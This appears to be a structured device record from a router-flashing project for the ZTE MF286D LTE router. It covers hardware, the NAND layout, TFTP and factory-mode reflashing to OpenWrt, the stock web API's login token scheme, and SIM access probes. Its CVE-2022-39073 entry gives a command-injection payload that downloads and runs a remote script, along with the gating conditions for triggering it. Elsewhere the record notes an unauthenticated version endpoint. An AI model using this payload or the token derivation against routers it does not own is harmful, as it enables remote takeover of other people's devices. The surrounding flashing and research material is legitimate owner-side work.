description: MF286D LTE cat.12 router (IPQ4019 + MDM9650 modem, Nordic/Telia carrier family)

hardware.modem: ZTE MF286DMODULE (MDM9650, cat.12) on USB (dwc3), QMI 19d2:1485, AT port /dev/ttyUSB2
hardware.ethernet_ports: 4x LAN 1G + WAN via port1 (OpenWrt DT: wan=port1)
hardware.uart: Board has an unpopulated 4-pin header (3.3V UART, 115200); no serial required for the TFTP flash method

nand_partition_map._units: bytes; runtime mtdN in parentheses (NAND mtd0..11, NOR mtd12..19)
nand_partition_map.fota-flag: 0x0000000 + 0xA0000 (mtd0) — bootloader handoff flag, first good 128KiB block, byte 0

tftp-blank-download.description: Stock U-Boot blank-download recovery: the bootloader itself TFTP-pulls root_uImage from 192.0.0.1:69 and rewrites web+rootfs (never NOR). Retail units have EXACTLY ONE no-serial entry: rootfs UBI attaches but has no kernel volume (interrupted flash or a deliberately staged trigger UBI). The factory-kit uboot.bin additionally has a reset-hold download mode + standalone 192.0.0.1 handler; RETAIL APPSBL contains neither (verified by full boot-tree disassembly: all downloader code lives in the volume-not-found chain). Serial `run lr` is the only other entry.
tftp-blank-download.client_ip: derived per boot (192.x.y.z; watch ARP or the RRQ source)
tftp-blank-download.image: root_uImage wrapper, exactly 38797312 bytes: [8MiB web region][0x1D00000 UBI(kernel,rootfs,rootfs_data)] — see docs/zte-mf286d-flashing.md
tftp-blank-download.tftp_options: blksize (client asks 1468) + timeout (5s) — RFC 2348/2349 OACK required
tftp-blank-download.success_signal: UDP payload 'OK:zte blank download is done' sent back to the server :69 after the write completes
caveats: Rootfs content decides the boot outcome: valid UBI + no kernel volume = pull triggers; zeros OR fully-erased 0xFF = `ubi part fs` fails BEFORE the kernel-volume check and the unit drops to a UART-only prompt (no web, no TFTP, no button fallback). Zeros and erased are equally fatal.

The U-Boot 'recovery' boot branch (SMEM boot-reason != normal) is NOT an alternate rescue: its NAND variant runs the same `ubi part fs && ubi read kernel` chain (same broken partition) and its NOR variant reads reserved1, which ships EMPTY (all 0xFF). No network variant exists anywhere in the recovery function.

Buttons are gpio-keys SOFTWARE inputs only (reset=GPIO18, wifi=GPIO11, active-low): no PMIC/PON wiring, no PS_HOLD function, not polled by SBL1/QSEE/U-Boot — pressing them before Linux boots does nothing (verified in DTB + disassembly + empirically).
No altbootcmd / bootretry / bootcount fallback machinery exists in this U-Boot build.

The entire network stack (ARP/IP/UDP/TFTP/DHCP handlers) executes only inside NetLoop, reachable solely via the volume-not-found path or serial commands — a unit sitting at the prompt after a bad rootfs has NO network listener at all (probes are provably futile).
Serve ANY requested filename (aliased to the pinned image) — the zdu no-bootfile path derives a per-boot 4-hex-byte name
Never run two servers on 192.0.0.1:69; the fin packet is the only success oracle

Ready-made 2022-era OpenWrt root_uImage sha256 01f6f7bc310c26e5bbee5992aa79dbf4e5683a0f40226152ad307c92f02071d3; official 25.12.6 sysupgrade sha256 20f41c151a0d255baa3d3ba0f0eea295567376b04e34d6ddeeb5a4cfe565c641.

zte-suf-root-uimage.description: ZTE Sales Update Framework flashing of a crafted root_uImage (mtd8+mtd9 concatenation, 38797312 bytes, erased 0xFF padding then UBI at 0x800000)
zte-suf-root-uimage.provenance: Stock images: dl.eko.one.pl/orig/zte_mf286d/NORDIC/{B02..B11}; CAUTION: NORDIC/B12/mtd9.bin is NOT stock — it is a community OpenWrt 22.03-rc5 dump whose bundled goahead differs from stock (ztsuf lane finding, #621). Ready-made OpenWrt root_uImage sha256 01f6f7bc310c26e5bbee5992aa79dbf4e5683a0f40226152ad307c92f02071d3 (2022-era, bootstrap then sysupgrade) or build fresh from official 25.12.6 sysupgrade sha256 20f41c151a0d255baa3d3ba0f0eea295567376b04e34d6ddeeb5a4cfe565c641
zte-suf-root-uimage.partitions_touched: mtd8+mtd9 only; bootloader/NOR/ART/modem EFS untouched (dump remaining partitions from OpenWrt post-flash for the unit-unique backup)
zte-suf-root-uimage.rollback: same flow with stock root_uImageorig from the kit
zte-suf-root-uimage.status: superseded for installs by tftp-blank-download; retained for stock-rollback service and for units already inside the SUF/E3 tooling path
zte-suf-root-uimage.envelope_notes: LAN, device in download mode (or driven there via SwitchFactoryMode), ~5 min write window
zte-suf-root-uimage.resources_notes: SUF kit (makebit/mf286d-openwrt archive or equivalent UPDATE/ set); Windows PE environment (community uses Hiren's/Gandalf PE; QEMU+ISO or wine attempt); admin web password; point-to-point or isolated VLAN to the device (download-mode DHCP + SBL listener)

tested_hardware.confirmed_on: Nordic/Telia B09 router + BD_TELIAMF286DV1.0.0B09 modem (2026-11: full flash to OpenWrt 25.12.6 via tftp-blank-download, zero bricks, no serial)
tested_hardware.modem_fw_note: QMI works on modem fw B11/B12 and below; B14 breaks QMI under OpenWrt (community-verified; downgrade is lengthy). Check ATI before configuring wwan.

notes: Species-level docs in docs/zte-mf286d-flashing.md. Stock rollback: serve a full-stock root_uImage (e.g. the Telia/Nordic B02 kit image) over the same TFTP path. Exploit-grade research (stock-web command injection, FOTA signature-chain findings) is intentionally NOT documented here — it lives in the private research repo pending a disclosure decision. Species-level record for conwrt issue #621. Unit-level identifiers (MAC/IMEI/passwords) belong in the operator's private project only. Modem capability detail (from species-flashing lane): {"band_lock_at": "AT+ZSNT / AT+ZNLOCKBAND / AT+ZLOCKCELL (AT port /dev/ttyUSB2)", "external_antennas": "2x SMA", "lte": true, "qmi": true}.

stock_web.server: ZTE-Webs/2.5.0 (goahead-derived; handler binary usr/bin/goahead or zte_topsw_goahead depending on generation)

api.login_password_encoding: SHA256hex-UPPERCASE(Base64(password)) — note: uppercase hex; MU5001-era lowercase variants do NOT match
api.session: IP-bound + AD token per POST: AD = md5hex(md5hex(wa_inner_version + cr_version) + RD), RD fetched read-only via cmd=RD
api.lockout: 5 failed logins -> 300s lock; counter PERSISTS ACROSS REBOOTS (stored in cfg). Do not brute-force; compute the token offline.
api.notes: Version reads (wa_inner_version, cr_version) answer unauthenticated. Authenticated browser-context is the most reliable write channel; bare curl sessions can return ambiguous results for some goformIds.

factory_channel.description: The ZTE Sales Update Framework (SUF/ZAS) manufacturing protocol is reachable from the LAN via the stock web API with admin credentials

endpoints.ONLINE_UPGRADE_TOOL: goformId=ONLINE_UPGRADE_TOOL&command=get_current_version -> full version manifest. ANSWERS UNAUTHENTICATED (info disclosure, CVE-report candidate)

download_mode.entry: Fota-flag partition byte 0 gates U-Boot every boot (uaztemain): 0x45/0x47/0x55 -> update flow, 0x20/0x4e/0x42/0xff -> normal boot. Flag writer is /usr/bin/update_control set_update_flag() (0x45/0x55/0x20 for its modes). A sticky flag with an EMPTY delta partition = per-boot retry then normal boot — it never pulls root_uImage; the flag only gates an in-NAND delta apply at 0x3500000. Devices observed stuck in the E3/download environment across power cycles carry a sticky flag plus staged state; the E3 env runs its own ZTE-Webs/2.5.0 at 192.168.32.1
download_mode.behavior: Device becomes DHCP client REQUESTING 192.168.32.1 and ARPs every ~1-5s for the tool host 192.0.0.1; SBL tftp-Gets armprg (armprgZTE.bin) from the tool's TFTP :69, then Sahara hello (8x1s retries) -> Firehose. One-shot per boot attempt. Live factory-state ports observed on the LAN side: 3535, 8787 (facSvr candidates), 10005 (remserial).
download_mode.tool: ZTE_Sales_Update_Framework.exe (Windows, MFC; runs under wine 9.0 only to splash+crash — use WinPE/QEMU); UPDATE/ folder images are NOT signature-checked (community root_uImage swaps proven)

cve-2022-39073.title: WATCH_DOG_SWITCH net_link_detect_url command injection (MF286R, CVSS 9.8)
cve-2022-39073.status_on_this_device: handler LIVE on Nordic B09/B10-gen; net_link_detect_url accepts and stores ';'-payloads byte-intact (verified readback); exec sink is system('watch_dog_ping.sh <url> <times>') in zte_net_link_detect
cve-2022-39073.gate: WAN status must be ppp_connected/ipv4_ipv6_connected/ipv6_connected (exact match — beware 'connected' substring matching 'ppp_disconnected'!); the binary refuses to run its check otherwise
cve-2022-39073.payload_pattern: ;curl -o /tmp/s http://<host>:<port>/s;chmod +x /tmp/s;/tmp/s (curl AND tftp both present in this generation's rootfs)
cve-2022-39073.watch_out: the same feature REBOOTS the device after net_link_detect_ping_times failed pings — set ping_times high when arming, or the box reboot-cycles

cve-2023-25649.title: SET_DEVICE_LED night-mode command injection (MF286R, ZDI-23-818)
cve-2023-25649.status_on_this_device: endpoint live; time fields strictly digits+colon; night_mode_close_all_led accepts arbitrary strings but no observable exec on the runtime path (adb-shell cfg-set template exists in binary string table). Needs exact-generation disasm to chase further.

nvram-websurlfilters-chain.title: Leo-PL websURLFilters -> zte_debug.sh tftp exec (eko.one.pl 19085)
nvram-websurlfilters-chain.status_on_this_device: ABSENT: Nordic B09/B10 zte_debug.sh is a log-compression script with no tftp/exec feature; ipacm_switch.sh only tests the value for emptiness. Pre-existing injection entries found stored on a second-hand unit were inert.

bench_observations: Variant fingerprint: BD_TELIAMF286DV1.0.0B09 / CR_TELIAMF286DV1.0.0B10 / Nordic_MF286D_B10 (mix of B09 wa + B10 cr strings is normal)
USB ethernet adapters on the AI host: r8152 devices need power/control=on pinned (autosuspend disconnect-storms under load)
Laptop /tmp cleaners remove staged scripts/ISOs across multi-day sessions — re-stage from source repos or keep under /tmp/opencode subdirs with recent mtimes
Port 8080 on shared build hosts is frequently taken by other lanes' docker — verify payload-server ports before arming remote-exec URLs

sim_access.measured_on: BD_TELIAMF286DV1.0.0B12 modem firmware, OpenWrt 25.12.6, live probe 2026-11-07
sim_access.at_surface: no AT+CSIM (operation not supported); AT+CRSM works (read-only classic file access)
sim_access.qmi_uim: transparent APDU round-trip works via uqmi --uim-apdu-send for non-AID APDUs (genuine card status words); OPEN_CHANNEL forwards arbitrary AIDs to the card
sim_access.esim_lockout: deliberate firmware policy: OPEN_CHANNEL fw-denies the ISD-R AID alone (arbitrary other AIDs pass through); SEND_APDU blocks SELECT-by-AID (INS=A4 P1=04) as a class while allowing SELECT-by-FID. All paths to an ISD-R session are closed — the species cannot act as an eSIM reader on stock modem firmware. (Negative for eUICC/SAP; positive as classic-file reader — see docs/modem-as-reader appendix.)
